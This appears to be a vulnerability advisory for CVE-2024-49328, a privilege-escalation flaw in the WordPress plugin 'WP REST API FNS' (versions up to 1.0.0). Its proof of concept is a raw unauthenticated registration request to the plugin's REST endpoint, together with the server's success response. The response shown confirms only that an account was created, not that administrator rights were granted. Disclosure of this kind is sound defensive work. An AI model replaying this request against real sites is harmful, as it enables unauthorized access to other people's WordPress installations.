# CVE-2024-49328
WP REST API FNS &lt;= 1.0.0 - Privilege Escalation

# Description:
The WP REST API FNS Plugin plugin for WordPress is vulnerable to privilege escalation in all versions up to, and including, 1.0.0. This makes it possible for unauthenticated attackers to gain administrator privileges.

```
CVE: CVE-2024-49328
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
CVSS Score: 9.8
Slugs: rest-api-fns
```


POC
---

Request

```
POST /wp-json/api/v2/user/register HTTP/1.1
Host: kubernetes.docker.internal
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:132.0) Gecko/20100101 Firefox/132.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://kubernetes.docker.internal/wp-admin/plugins.php?plugin_status=all&paged=1&s
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Content-Type: application/json
Content-Length: 57

{"email": "user@example.com", "password": "yourpassword"}
```

Response

```
HTTP/1.1 200 OK
Date: Wed, 06 Nov 2024 16:25:12 GMT
Server: Apache/2.4.57 (Debian)
X-Powered-By: PHP/8.2.13
X-Robots-Tag: noindex
Link: <http://kubernetes.docker.internal/wp-json/>; rel="https://api.w.org/"
X-Content-Type-Options: nosniff
Access-Control-Expose-Headers: X-WP-Total, X-WP-TotalPages, Link
Access-Control-Allow-Headers: Authorization, X-WP-Nonce, Content-Disposition, Content-MD5, Content-Type
Allow: POST
Content-Length: 191
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: application/json; charset=UTF-8

{"status":200,"message":"User Register Successfully","data":{"user_id":"7","user_email":"user@example.com","user_nicename":"userexample-com","user_fname":"","user_lname":"","profile_url":""}}
```
